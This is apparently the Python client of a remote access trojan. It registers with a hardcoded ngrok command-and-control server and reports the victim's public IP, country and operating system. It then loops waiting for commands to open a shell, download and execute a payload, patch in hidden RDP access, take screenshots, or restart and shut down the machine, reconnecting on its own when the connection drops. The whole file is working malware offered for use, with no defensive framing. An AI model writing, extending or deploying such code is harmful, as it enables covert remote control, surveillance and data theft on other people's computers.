import requests
import urllib.request
from ast import literal_eval
from platform import platform
from time import sleep
import argparse
from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot


SERVER_ADDRESS = "https://47f7-121-200-4-145.ngrok-free.app"  # Replace with the ngrok URL obtained after running ngrok
#SERVER_ADDRESS = "http://localhost:8000" #test
RECONNECT_TIMER = 5

parser = argparse.ArgumentParser()
parser.add_argument('-srvr-addr', type=str, help='server address')
args = parser.parse_args()

if args.srvr_addr:
    SERVER_ADDRESS = args.srvr_addr

class Client:
    def __init__(self):
        """
        This will initiate the connection to the server
        """
        self.server_address = SERVER_ADDRESS
        try:
            response = requests.post(f"{self.server_address}/new_client", json={"ip": "127.0.0.1"})
            if response.status_code == 200:
                print(f"Connected successfully to the server at {self.server_address}")
            else:
                print(f"Failed to connect to the server at {self.server_address}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to connect to the server at {self.server_address}: {e}")

    def send(self, message):
        """
        Sends a message to the server
        :param message: Message to send to the server (str)
        """
        url = f"{self.server_address}/send"
        data = {"message": message}
        try:
            response = requests.post(url, json=data)
            if response.status_code != 200:
                print(f"Failed to send message: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send message: {e}")

    def receive(self):
        """
        Receives a message from the server
        :return: Message received from the server (str)
        """
        url = f"{self.server_address}/receive"
        try:
            response = requests.post(url)
            if response.status_code == 200:
                message = response.json()['message']
                if message:
                    return message.split(maxsplit=1)
                else:
                    return []
            else:
                print(f"Failed to receive message: {response.text}")
                return []
        except requests.exceptions.RequestException as e:
            print(f"Failed to receive message: {e}")
            return []

def main():
    """ Connects to the server and send it info about the system """
    try:
        # Send client info to the server - IP, Country Code, Name, Os
        response = literal_eval(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
        print(response)
        if response['status'] == 'success':
            client = Client()
            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], requests.get('http://ip.42.pl/raw').text, platform()))

            # Respond to server requests
            while True:
                cmd = client.receive()
                if cmd:
                    print("Command received: {}".format(cmd))
                    cmd = cmd.split(maxsplit=1)
                    print(cmd)
                    if cmd[0] == 'shell':
                        Shell.shell(client, cmd[1])
                    elif cmd[0] == 'restart':
                        Power.restart()
                    elif cmd[0] == 'shutdown':
                        Power.shutdown()
                    elif cmd[0] == 'execute':
                        Execute.download_and_execute(client)
                    elif cmd[0] == 'hrdp':
                        HRDP.patch(client, cmd[1], SERVER_ADDRESS)
                    elif cmd[0] == 'screenshot':
                        Screenshot.take_screenshot(client)
                    else:
                        client.send('[!] Unconfigured option')
                else:
                    sleep(1)
        else:
            print('Error obtaining client data... Trying to reconnect...')
            sleep(RECONNECT_TIMER * 10)
    except requests.exceptions.RequestException:
        print('Connection lost... Trying to reconnect...')
        sleep(RECONNECT_TIMER)
        main()

if __name__ == "__main__":
    # Send client info to the server - IP, Country Code, Name, Os
    response = literal_eval(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
    print(response)
    if response['status'] == 'success':
        client = Client()
        client.send('{},{},{},{}'.format(response['query'], response['countryCode'], requests.get('http://ip.42.pl/raw').text, platform()))
    main()